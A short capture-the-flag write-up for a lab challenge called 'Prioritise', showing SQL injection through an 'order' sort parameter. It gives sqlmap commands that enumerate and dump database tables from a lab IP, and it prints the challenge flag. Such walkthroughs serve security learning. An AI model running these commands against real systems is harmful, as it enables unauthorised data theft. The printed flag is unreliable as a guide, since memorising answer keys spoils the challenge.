---
description: In this challenge you will explore some less common SQL Injection techniques.
---

# Prioritise

#### Challenge :&#x20;

<figure><img src="../../../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>

Let's First add the any Item !!!

<figure><img src="../../../.gitbook/assets/image (76).png" alt=""><figcaption></figcaption></figure>

Then Right Side of Sort By - Choose any Thing !!

<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

Check The Url Parameter Is `Order`

<figure><img src="../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

```
sqlmap -u http://10.48.132.245/?order=title --batch --dbs --tables
```

Then I use Sqlmap To Check The Vulnerability and It's Work We Got Two Tables !!

* flag
* todos

<figure><img src="../../../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

Let's Dump The Flag Following Command !!

```
sqlmap -u http://10.48.132.245/?order=title --batch --dbs -T flag --dump
```

<figure><img src="../../../.gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>



```
Flag : flag{65f2f8cfd53d59422f3d7cc62cc8fdcd}
```
